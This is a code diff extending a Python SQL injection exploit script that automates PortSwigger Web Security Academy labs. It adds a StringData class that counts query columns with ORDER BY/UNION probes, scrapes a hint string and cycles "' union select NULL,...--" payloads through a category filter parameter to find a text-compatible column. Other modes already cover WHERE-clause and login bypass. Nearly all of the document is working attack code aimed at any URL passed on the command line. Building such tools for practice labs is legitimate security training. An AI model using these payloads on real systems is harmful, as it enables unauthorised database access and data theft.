@@ -1,5 +1,6 @@
 import requests
 import sys
+import re
 import urllib3
 from bs4 import BeautifulSoup
 import signal
@@ -65,6 +66,22 @@ def error_usage(exp):
         print(
             "[-] Reference: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns"
         )
+    elif exp == "sd":
+        print(
+            "[-] Usage: %s <exploit_type> <payload_type> <url> <path_param>"
+            % sys.argv[0]
+        )
+        print(
+            '[-] Example: python3 %s sd orderby https://website.net "/filter?category=Gifts"'
+            % sys.argv[0]
+        )
+        print(
+            '[-] Example: python3 %s sd union https://website.net "/filter?category=Gifts"'
+            % sys.argv[0]
+        )
+        print(
+            "[-] Reference: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text"
+        )
     # sys.exit(-1)
 
 
@@ -110,16 +127,28 @@ def run_exploit(args):
         # If it doesn't have all the parameters, we print usage.
         except IndexError as error:
             error_usage(exploit_type)
+    elif exploit_type == "sd":
+        try:
+            payload_type, url, path_param = sys.argv[2], sys.argv[3], sys.argv[4]
+            hint = StringData.get_string(url, path_param)
+            string_data = StringData(payload_type, url, path_param, hint)
+            num = string_data.get_column_number(payload_type, url, path_param)
+            if num:
+                string_data.exploit_sqli(num, url, path_param, hint)
+        # If it doesn't have all the parameters, we print usage.
+        except IndexError as error:
+            error_usage(exploit_type)
     elif exploit_type not in exploit_types:
         print(f'That "{exploit_type}" exploit type doesn\'t exist here.')
         sys.exit(-1)
 
 
-""" WhereClause() ##############################################################
+""" WhereClause ################################################################
 SQLi vulnerability in the product category filter. When a category is selected, 
 the application carries out a SQL query like the following:
 SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 Attack Will cause the application to display one or more unreleased products.
+https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
 wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww """
 
 
@@ -152,6 +181,7 @@ class WhereClause:
 """ LoginBypass() ##############################################################
 SQLi vulnerability in the login function. This is an SQL injection attack where 
 you can log in to the application as the administrator user.
+https://portswigger.net/web-security/sql-injection/lab-login-bypass
 wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww """
 
 
@@ -201,9 +231,10 @@ class LoginBypass:
             print("SQLi Error Return Type: ", type(e))
 
 
-""" UnionCols() ################################################################
+""" UnionCols ##################################################################
 SQLi UNION (and ORDER BY) attack, where the number of columns is determined when
 the query is returned. The vulnerability is in the product category filter.
+https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
 wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww """
 
 
@@ -304,6 +335,111 @@ class UnionCols:
             print("[-] The SQLi was not successful...")
 
 
+""" StringData #################################################################
+SQLi vulnerability in the product category filter. Use a union or order by attack
+to retrieve data from other tables. 
+1) Determine the number of columns returned by the query. 
+2) Identify a column that is compatible with string data.
+https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
+wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww """
+
+
+class StringData:
+    def __init__(self, payload_type, url, path_param, hint) -> None:
+        self.payload_type = (payload_type,)
+        self.url = (url,)
+        self.path_param = path_param
+        self.hint = hint
+        self.text = False
+
+    # Call UnionCols.column_number() to get number of columns.
+    def get_column_number(self, payload_type, url, path_param):
+        col_num = UnionCols(payload_type, url, path_param)
+        num = col_num.column_number(payload_type, url, path_param)
+        return num
+
+    """ get_string(url, path_param) 
+    Extract and return the string from the HTML that you need to solve the lab. """
+
+    def get_string(url, path_param):
+        try:
+            req = requests.get(url + path_param, verify=False, proxies=proxies)
+            soup = BeautifulSoup(req.text, "html.parser")
+            # Get the p tag with the hint id.
+            results = soup.find("p", attrs={"id": "hint"})
+            # res = re.search(r"'\s*([^']+?)\s*'", str(results)).groups()[0]
+            # print('%r' % res)
+            # Get the characters between the single quotes in the text.
+            res = re.search(r"'([^']*)'", str(results)).groups()[0]
+            # print(res)
+            return res
+        except Exception as e:
+            template = "An exception of type {0} occurred. Arguments:\n{1!r}"
+            # message = template.format(type(e).__name__, e.args)
+            if type(e).__name__ == "ProxyError":
+                print("Error Type: ProxyError. Check the proxy.")
+            else:
+                print("Error Return Type: ", type(e))
+
+    """ exploit_sqli_string(num_col, url, path_param, hint) 
+    Loop though the column numbers, test each request for SQLi and check the HTML 
+    for when the query text matches the original hint. """
+
+    def exploit_sqli_string(self, num_col, url, path_param, hint):
+        # print(url, path_param, hint)
+        # print(f"[+] The number of columns is {str(num_col)}." )
+        print("---------------------------------------------------")
+        print("[+] Figuring out which column contains text...")
+        try:
+            for i in range(1, num_col + 1):
+                string = f"'{hint}'"
+                # Remove single quotes from string.
+                string_strip = string.strip("'")
+                # Create list with three NULL using number of columns.
+                payload_list = ["NULL"] * num_col
+                # Insert hint at next index after each pass.
+                payload_list[i - 1] = string
+                # Prepare string to inject into list.
+                list_join_str = ", ".join(payload_list)
+                # sql_payload = "' union select " + ', '.join(payload_list) + "--"
+                # Inject string into next index after each pass.
+                sql_payload = f"' union select  {list_join_str}--"
+                print(f"{i} Payload: {sql_payload}")
+                # Send request with the next assembled payload.
+                req = requests.get(
+                    url + path_param + sql_payload, verify=False, proxies=proxies
+                )
+                soup = BeautifulSoup(req.text, "html.parser")
+                # Locate sting if it was outputted down in the HTML.
+                res = soup.find("section", attrs={"class": "maincontainer"})
+                hint_output = re.search(hint, str(res))
+                # If the output was found, this column is a string data type.
+                if hint_output is not None and string_strip == hint_output.group():
+                    # if hint_output is not None:
+                    print(f"{i} [+] Searching for text: {hint_output.group()}")
+                    print(f"{i} [+] Column {str(i)} contains text, a string data type.")
+                    print("---------------------------------------------------")
+                    self.text = True
+                elif hint_output is None:
+                    print(f"{i} [+] Searching for text: {string}")
+                    print(f"{i} [-]{string} was not found.")
+                    print(f"{i} [-] Column {str(i)} is not a string data type.")
+                    print("---------------------------------------------------")
+            if self.text:
+                return True
+            else:
+                return False
+        except Exception as e:
+            print("SQLi Error Return Type: ", type(e))
+
+    def exploit_sqli(self, num, url, path_param, hint):
+        text_found = self.exploit_sqli_string(num, url, path_param, hint)
+        if text_found:
+            print("[+] SQL injection successful...")
+        else:
+            print("[-] The SQLi was not successful...")
+
+
 def signal_handler(sig, frame):
     print("\n[+] Exploit aborted with Ctrl-c.")
     # Run any clean up commands here.
@@ -321,3 +457,4 @@ if __name__ == "__main__":
         print("wc = Where Clause")
         print("lb = Login Bypass")
         print("uc = Union Columns")
+        print("sd = String Data")
